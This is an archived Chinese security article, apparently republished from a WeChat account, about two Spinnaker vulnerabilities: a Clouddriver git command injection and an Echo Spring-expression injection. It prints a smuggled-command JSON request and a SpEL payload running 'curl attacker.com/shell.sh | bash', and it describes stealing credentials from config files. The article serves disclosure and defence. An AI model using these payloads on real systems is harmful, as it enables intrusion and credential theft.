---
cve: "CVE-2026-32604; CVE-2026-32613"
source: "gelusus/wxvl 公众号漏洞文库"
title: "Spinnaker爆出两大“王炸”级漏洞，直接拿下生产环境"
product: "Spinnaker Clouddriver/Echo"
record_type: "advisory"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "active"
primary_identifiers: "CVE-2026-32604; CVE-2026-32613"
referenced_identifiers: ""
identifier_role: "primary"
prerequisites: "32604 valid artifact credential and certain shell-auth mode;32613 application-write/pipeline permission; internal-network reach varies"
source_status: "unknown"
side_effects: "原文未完整记录副作用、清理步骤或运行验证；阅读样例不等于获准在真实系统执行。"
id: "vw-c2e63cc14d5a47955b484f26"
entity_id: "ve-c2e63cc14d5a47955b484f26"
schema_version: "1"
---

# Spinnaker爆出两大“王炸”级漏洞，直接拿下生产环境

<!-- vulwiki-editorial:start -->
## 校订与适用边界

- 适用前提：32604 valid artifact credential and certain shell-auth mode;32613 application-write/pipeline permission; internal-network reach varies
- 证据范围：Separates git version command injection and SpEL context injection; impact constrained by service/cloud credentials

### 尚未解决的证据缺口

以下限制仍适用于后文历史材料；相关版本、结果或修复结论不能据此视为已验证：

- Opening anylowprivileged user overstates later app-write/auth-mode conditions
- All backend traffic trusted claim overgeneralized without deployment/network/auth configurations
- 94 public instances requires as-of query/method, not vulnerable count
- Complete cloud takeover not automatic; depends credentials and authorization scope
- Fix versions2026.0.1/2025.4.2/2025.3.2 need official release mapping

本页为文本校订，未执行代码、PoC 或目标请求；原图仅保留引用，未据此确认复现成功。
<!-- vulwiki-editorial:end -->

## 技术正文与历史材料

 幻泉之洲   2026-04-23 02:57  
  
>   
  
## 这不是演习  
  
如果你在用Spinnaker管理云部署，现在最好立刻检查一下版本。  
  
安全团队ZeroPath最近扒出了Spinnaker里的两个关键漏洞，编号CVE-2026-32604和CVE-2026-32613。两个漏洞的CVSS评分都是可怕的9.9分，离满分只差0.1。简单说，任何通过认证的低权限用户，都能利用它们拿下Spinnaker的核心服务器，进而接管整个云环境。  
  
想想看，Spinnaker是干什么的？它是部署应用的。攻击者拿下它，就等于拿到了通往源代码仓库和生产云环境的万能钥匙。这个杀伤力，已经不能用“严重”来形容了。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/tbTbtBE6TibeYcM00yGrR0ibdJD6M91iaYJXBcrLqhm1dwS0x6bmXFAK7C1Riag5XpCicbJWuHGojj49caJd0OWW8JosglYsy8tbl475hvUrBqBw/640?wx_fmt=png&from=appmsg "")  
## 谁在用Spinnaker？  
  
Spinnaker是Netflix搞出来的开源云原生部署平台，后来交给了持续交付基金会。现在用它的，都是些不差钱的大公司，Google、思科都在列。它的特点就是能处理极其复杂的部署流程，比如一个应用可能包含十几个微服务，每个又有多个副本，依赖关系像蜘蛛网。Spinnaker用“管道”这个概念来抽象这些流程，也正是这些复杂的功能，埋下了隐患。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/tbTbtBE6TibdsnKtfhfzMkOhpzYxz3EuMSRNWmIBcwaKuxS9vxbx3ou7ic8P9EQyJTVGuXSy1q4W77obV3eStpnQZNcQuU7GtT8OeW40LfR20/640?wx_fmt=png&from=appmsg "")  
  
虽然官方推荐内网部署，但在公网上还是能找到不少实例。用Shodan随便搜搜，就能发现94个暴露在外的Spinnaker。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/tbTbtBE6TibfT3xur6RmiaepluXp3pZFmrlLLeVoNnFFZk8c3CcicApiat3YpwsS69M6sk8DKF6O18hLS99WQuuq1YOWiaic8lq0rLbUibWLp7Cmrs/640?wx_fmt=png&from=appmsg "")  
## 看懂它的软肋：边界信任模型  
  
要明白漏洞为啥这么厉害，得先看懂Spinnaker是怎么“想当然”的。  
  
它的架构是一堆微服务，关键的有这么几个：对外提供API的Gate、执行管道的Orca、跟云环境打交道的Clouddriver、事件中枢Echo、负责授权的Fiat。  
  
安全问题就出在它的信任模型上。Spinnaker默认所有内部网络流量都是可信的。Gate作为大门，负责所有认证和授权，一旦请求过了Gate这一关，后面的服务（比如Clouddriver、Echo）就不再做任何检查了，直接执行。  
  
这就好比小区大门有保安，但进了小区后，所有单元门都不上锁。攻击者只要骗过保安（拿到一个低权限账号），或者想办法翻墙进去（从已沦陷的内部服务发起请求），就能在小区里为所欲为。  
  
## 第一个洞：Clouddriver远程代码执行  
  
**CVE-2026-32604，Clouddriver成了跳板。**  
  
Clouddriver是“肥肉”，因为它手里攥着访问生产环境的云凭证。漏洞出在它的一个API端点 PUT /artifacts/fetch 上，这个接口本来是用来下载构建产物的，比如从Git仓库拉代码。  
  
攻击者发一个恶意的请求，比如：  
  
{
    "type": "git/repo",
    "reference": "https://example.com/repo.git",
    "version": "main; touch /tmp/pwned;",
    "artifactAccount": "某个已有的凭证名"
}  
  
问题在于，version 字段（比如分支名）被直接拼接到shell命令里，没做任何过滤。在某些认证模式下，Spinnaker会用sh -c来执行git命令，于是分号;就被shell解析，后面的touch /tmp/pwned就执行了。  
  
只要攻击者知道一个有效的凭证名（通过另一个公开接口就能拿到列表），他就能让Clouddriver执行任意命令。拿到shell后，第一件事就是去读 /opt/spinnaker/config/clouddriver.yml，里面往往明文存着各种密钥。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/tbTbtBE6Tibd9jzJrLXFDea3lq7kLGMc20PH3SJFEyua0VJZTVYplSWoBoQKj055rSbDH36YWzpONXmaWvQpdhYuB5Q7EibePrwwxDwXYaLDM/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/tbTbtBE6TibfWVwV91NuIU9MbiaGog27z9TjR6srauRkuUSKHBVibzP6h7ADLs24pKrIHmicibS3qlfYr00qzzStob45r9h5CkRKf0O5ia5bHQj6M/640?wx_fmt=png&from=appmsg "")  
## 第二个洞：Echo服务器Spring表达式注入  
  
**CVE-2026-32613，从事件中枢下手。**  
  
这个漏洞在Echo服务里。Spinnaker的管道可以声明它“期待”的构件，比如一个K8s部署文件。有时候这个文件名是动态的，可以用Spring表达式语言来写，比如 ${trigger.payload.repository.name}/deployment.yaml。  
  
Echo服务会在触发管道时，负责解析这些表达式。问题来了：它用了Spring框架里功能最强大的StandardEvaluationContext来解析，这个类能直接实例化任意Java类并执行代码。而Spring官方早就提供了更安全的SimpleEvaluationContext来处理不可信输入，Spinnaker其他地方也用了，偏偏在这里漏了。  
  
攻击者只要拥有对一个应用的“写”权限（或者找到一个配置为允许任何人写入的应用），他就能创建一个恶意的管道定义，在expectedArtifacts里埋入Spring表达式 payload：  
  
"name": "${new java.lang.ProcessBuilder(new String[]{'bash','-c','curl attacker.com/shell.sh | bash'}).start()}"  
  
一旦管道被触发，代码就在Echo服务器上跑起来了。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/tbTbtBE6TibeCVn1wXVT0HIiaUcaYNC2G17MxcUXwiaCN17icyP18312RVbDrTicOJ4wuXHdibAGSkKjgxPj1q0URxafibKq80pC5KiaOKPZlyj2WEM/640?wx_fmt=png&from=appmsg "")  
## 从得手到横扫：可怕的内部提权  
  
拿到Echo的shell可能觉得不过瘾？别急，Spinnaker的“无内网认证”特性来帮忙了。  
  
从Echo服务器内部，攻击者可以直接调用其他微服务的内部API，比如Clouddriver的那个 PUT /artifacts/fetch 接口。这个接口对外需要过Gate认证，但对内网其他服务完全不设防。  
  
于是攻击者可以列出现有的源代码仓库（如GitHub）凭证，然后让Clouddriver带着这些凭证去访问一个攻击者控制的服务器。凭证就这么轻轻松松泄露了。  
>   
> allowed-domains  
>   
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/tbTbtBE6TibcGuHibSC443DK3Vc7iaRCE8258CREp30sfHK4AuL6HPJ7WnCmQJQoiamibqQQVxJrLLFwt7k0b0EJFDRoN24en5WqzA70VVyqRibgc/640?wx_fmt=png&from=appmsg "")  
## 修补和防御，光升级不够  
  
漏洞已在Spinnaker 2026.0.1, 2025.4.2, 2025.3.2版本中修复。赶紧升级是第一步。  
  
但升级只是堵上了这两个具体的洞。更深层的问题是Spinnaker那种“大门紧，院内松”的边陲安全模型。为此，你得考虑更多：  
- **锁死网络**：严格限制Spinnaker各个微服务Pod之间的网络通信，按最小权限原则来。  
- **告别明文配置**：把云凭证、API令牌统统挪到外部的密钥管理服务（如HashiCorp Vault, AWS Secrets Manager）里，别让它们留在clouddriver.yml里。  
- **收紧访问**：上SSO和强MFA，别用简单的账号密码。严格控制对Spinnaker UI和API的访问。  
- **配置白名单**：在Clouddriver里务必设置allowed-domains，只允许它向受信任的域名发送凭证。  
- **加强监控**：密切关注Clouddriver和Echo Pod里有没有异常的进程或shell活动，监控密钥管理服务里来自Spinnaker的异常访问模式。  
## 留下的思考  
  
这次事件暴露出一个老生常谈却又屡教不改的问题：对于部署系统这种“皇冠上的明珠”，我们投入的安全关注度远远不够。大家都默认它跑在内网，前面有认证，就以为安全了。  
  
更让人警惕的是漏洞发现的趋势。这两个漏洞的原理（命令注入、代码注入）并不新奇，甚至有点“老掉牙”。它们能隐藏至今，很大程度上是因为Spinnaker本身太复杂，代码量大，内部信任关系混乱。而现在，AI工具正被用来快速梳理这种复杂系统的代码上下文，把藏在噪音里的致命漏洞精准地挑出来。  
  
这对防守方是个警示：过去那种靠漏洞“自然隐藏”在复杂代码里的侥幸心理，快行不通了。攻击工具在进化，我们的防御思维和深度必须跑得更快。对于Spinnaker这样的关键系统，是时候抛弃单一的边界防御，认真构建纵深防御体系了。毕竟，当部署工具本身被攻破时，游戏可能就已经结束了。  
### 参考资料  
  
[1]   
https://zeropath.com/blog/spinnaker-rce-production-compromise  
  


---

> 来源：gelusus/wxvl（微信公众号漏洞文章自动归档，原文见文首链接）
